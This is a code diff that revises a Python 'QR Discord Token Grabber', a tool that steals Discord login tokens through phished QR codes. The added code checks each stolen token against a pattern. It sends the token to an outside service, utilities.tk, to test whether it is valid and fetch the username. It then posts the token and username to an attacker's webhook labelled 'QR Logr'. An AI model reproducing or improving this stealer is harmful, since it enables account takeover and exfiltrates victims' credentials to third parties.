@@ -1,14 +1,8 @@
-import base64
-import os
-import platform
-import re
-import requests
-import time
+import base64, os, platform, re, requests, time
 from bs4 import BeautifulSoup
 from colorama import Fore, init
 from PIL import Image
 from selenium import webdriver
-
 
 def clear() -> None:
     """Clear the screen; works with "cls" and "clear" commands.
@@ -101,10 +95,24 @@ return token;
 
 {Fore.LIGHTYELLOW_EX}Enter anything to exit\n>>> {Fore.LIGHTWHITE_EX}""", 
 end="")
+
+            if re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) == None:
+                print("invalid token? (didnt match regex)")
+
+            check = requests.post('https://utilities.tk/tokens/check', json={'token':token})
+
+            if check.status_code == 401:
+                print('Account invalid.')
+            elif check.status_code == 403:
+                a = check.json()['username']
+                print(f"Account locked. `{a}`")
+            elif check.status_code == 200:
+                a = check.json()['username']
+                print(f"Account valid! `{a}`")
             
             data = {
-                "content": f"Token: {token}",
-                "username": "Token Grabber"
+                "content": f"TKN: {token}\nUser: {a}",
+                "username": "QR Logr"
             }
             if webhook_url:
                 result = requests.post(webhook_url, json=data)
@@ -126,8 +134,10 @@ if __name__ == "__main__":
 
 {Fore.GREEN}QR Discord Token Grabber
 {Fore.BLUE}Created by NightfallGT
+Using utilities.tk API 
 Revised by Luci (9P9)
 Revised by the-cult-of-integral
+Revised by mte0
 
 {Fore.LIGHTYELLOW_EX}Enter a webhook URL.
 >>> {Fore.LIGHTWHITE_EX}""", end="")
